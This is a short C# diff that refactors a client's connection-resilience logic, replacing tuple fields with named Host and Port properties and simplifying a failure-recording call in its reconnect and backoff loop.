@@ -1,4 +1,6 @@
 ﻿using Client.Helper;
+using Client.Connection;
+using Client.Algorithm;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -74,8 +76,8 @@ namespace Client.Connection
 
                     // Get next target from ConnectionResilience
                     var target = connectionResilience.GetNextTarget();
-                    targetHost = target.Item1;
-                    targetPort = target.Item2;
+                    targetHost = target.Host;
+                    targetPort = target.Port;
                 }
                 else
                 {
@@ -133,7 +135,7 @@ namespace Client.Connection
                     // Apply exponential backoff
                     if (reconnectAttempts < maxReconnectAttempts)
                     {
-                        connectionResilience.RecordFailure(targetHost, targetPort);
+                        connectionResilience.RecordFailure();
                     }
                     else
                     {
